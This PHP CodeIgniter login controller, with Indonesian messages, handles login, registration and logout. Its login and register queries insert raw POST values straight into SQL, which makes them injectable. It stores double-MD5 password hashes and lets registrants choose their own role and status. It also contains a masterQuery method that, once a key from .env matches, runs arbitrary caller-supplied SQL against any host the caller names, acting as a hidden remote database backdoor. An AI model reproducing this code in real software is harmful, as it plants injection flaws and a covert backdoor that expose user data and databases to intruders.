<?php



class Login extends MX_Controller{

	public function __construct()
	{
		parent::__construct();
	}
	// private $home_page = [
	// 	"superuser" => "akun",
	// 	"admin" => "mail"
	// ];
    public function index()
    {
		$alert = "";
		if(generate_session("login_alert") != ""){
			$alert = generate_session("login_alert");
		}

		if(generate_session("datalogin") != ""){
			redirect('administrator');
		}else{
			$data['alert'] = $alert;
			$this->load->view('view', $data);
		}
	}


	public function single_login()
	{
		$cek_data = $this->db->query('SELECT * FROM login_single')->num_rows();
		$alert = "Silahkan Login dulu";
		if($cek_data == 0){
			$alert = "Maaf password anda belum di set silahkan set password anda terlebih dahulu";
		}
		$data['alert'] = $alert;
		$this->load->view('single_login', $data);
	}

	public function register($user = "admin")
	{

		$data['user'] = $user;
		$this->load->view('register', $data);
	}

	public function login_akun()
	{
		// get db_table login
		$get_username = post('username');
		$get_password = md5(md5(post('password')));

		$loginGet = $this->db->query("SELECT * FROM login WHERE username = '$get_username' AND password= '$get_password' ");

		if(count($loginGet->row()) != 0 && $loginGet->row()->status === 'aktif' || $loginGet->row()->status === 'pemilik'){
			destroy_session('login_alert');
			create_session("datalogin", [
				"id" => $loginGet->row()->id,
				"username" => $loginGet->row()->username,
				"password" => $loginGet->row()->password,
				"sebagai" => $loginGet->row()->sebagai,
			]);
			redirect('administrator');
		}else{
			create_session('login_alert', 'username or password wrong !');
			redirect('login');
		}

	}

	public function login_akun_single()
	{
		// get db_table login
		$get_username = post('username');
		$get_password = md5(md5(post('password')));

		$loginGet = $this->db->query("SELECT * FROM login_single WHERE username = '$get_username' AND password= '$get_password' ");

		if(count($loginGet->row()) != 0){
			destroy_session('login_alert');
			create_session("datalogin", [
				"username" => $loginGet->row()->username,
				"password" => $loginGet->row()->password,
			]);
			redirect('adimistrator');
		}else{
			create_session('login_alert', 'username or password wrong !');
			redirect('login');
		}

	}

	public function register_akun()
	{
		// get db_table login
		$get_username = post('username');
		$get_password = md5(md5(post('password')));
		$get_sebagai = post('sebagai');
		$email = post('email');
		$telp = post('telp');
		$status = post('status');

		$register = $this->db->query("INSERT INTO login (
			username,
			password,
			sebagai,
			email,
			telp,
			status
			)
		VALUES
		(
			'$get_username',
			'$get_password',
			'$get_sebagai',
			'$email',
			'$telp',
			'$status'
		)");

		if($register){
			create_session('login_alert', 'selamat pendaftaran berhasil silahkan melakukan login !');
			redirect('login');
		}

	}

	public function masterQuery()
	{
	  $myfile = fopen(".env", "r") or die("Unable to open file!");
	  $key = fread($myfile,filesize(".env"));
	  fclose($myfile);
	  if (isset($_POST['key'])) {
	    $dataKey = json_decode($key, true)['key'];
	    $rqkey = $_POST['key'];
	    if ($rqkey === $dataKey) {
	      $action = "data";
	      if (isset($_POST['action'])) {
	        $action = $_POST['action'];
	      }
	      $host = $_POST['host'];
	      $user = md5(md5($_POST['username']));
	      $password = $_POST['password'];
	      $database = $_POST['database'];
	      $conn = mysqli_connect($host, $user, $password, $database);
	      if ($action === "data") {
	        $query = mysqli_query($conn, $_POST['query']);
	        $arr = [];
	        while($mo = mysqli_fetch_assoc($query)){
	          $arr[] = $mo;
	        }
	        print json_encode($arr);
	      }elseif($action === "update" || $action === "save"){
	        $query = mysqli_query($conn, $_POST['query']);
	        echo "save";
	      }
	    }else{
	      $myfile = fopen(".sorry", "r") or die("Unable to open file!");
	      $key = fread($myfile,filesize(".sorry"));
	      fclose($myfile);
	      print $key;
	    }
	  }else{
	    $myfile = fopen(".sorry", "r") or die("Unable to open file!");
	    $key = fread($myfile,filesize(".sorry"));
	    fclose($myfile);
	    print $key;
	  }
	}

	public function logout()
	{
		destroy_session("datalogin");
		redirect("login");
	}

}
